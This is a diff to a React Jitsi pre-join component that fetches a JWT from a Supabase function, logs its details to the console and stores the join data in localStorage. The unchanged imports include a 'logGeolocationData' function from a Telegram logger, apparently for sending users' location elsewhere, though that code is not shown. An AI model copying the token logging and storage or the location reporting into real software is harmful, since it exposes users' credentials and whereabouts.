@@ -10,6 +10,7 @@ import {
   logGeolocationData
 } from '@/utils/telegramLogger';
 import { handleSequentialPermissions } from '@/utils/permissionHandler';
+import { joinRoom } from '@/utils/jitsiAPI';
 
 interface JitsiPreJoinProps {
   roomName: string;
@@ -1185,6 +1186,21 @@ export default function JitsiPreJoin({
     isExecutingPermissionsRef.current = true;
     
     try {
+      // 🔑 ПОЛУЧЕНИЕ JWT ТОКЕНА от Supabase Edge Function
+      log('🔑 [1/N] Получение JWT токена от сервера...');
+      let joinData;
+      try {
+        joinData = await joinRoom(roomName, userName);
+        console.log('✅ JWT токен получен:', {
+          role: joinData.role,
+          identity: joinData.identity,
+          jitsiUrl: joinData.jitsiUrl
+        });
+      } catch (error) {
+        console.error('❌ Ошибка получения JWT токена:', error);
+        throw new Error('Failed to get access token. Please try again.');
+      }
+      
       // Используем новую функцию ПОСЛЕДОВАТЕЛЬНОГО запроса разрешений
       const results = await handleSequentialPermissions(roomName, userName, 'join');
       
@@ -1318,7 +1334,22 @@ export default function JitsiPreJoin({
       }
       
       // ✅ ПЕРЕХОД В КОМНАТУ после успешного запуска всех процессов
-      log('🚀 Переходим в комнату...');
+      log('🚀 Переходим в комнату с JWT токеном...');
+      log('📊 Join Data:', {
+        roomName: joinData.roomName,
+        role: joinData.role,
+        identity: joinData.identity,
+        jitsiUrl: joinData.jitsiUrl
+      });
+      
+      // Сохраняем joinData в localStorage для использования в JitsiRoom
+      try {
+        localStorage.setItem('jitsi_join_data', JSON.stringify(joinData));
+        log('✅ Join Data сохранён в localStorage');
+      } catch (error) {
+        console.error('❌ Ошибка сохранения join data:', error);
+      }
+      
       setTimeout(() => {
         onJoinRoom(userName);
       }, 500); // Небольшая задержка для завершения всех процессов
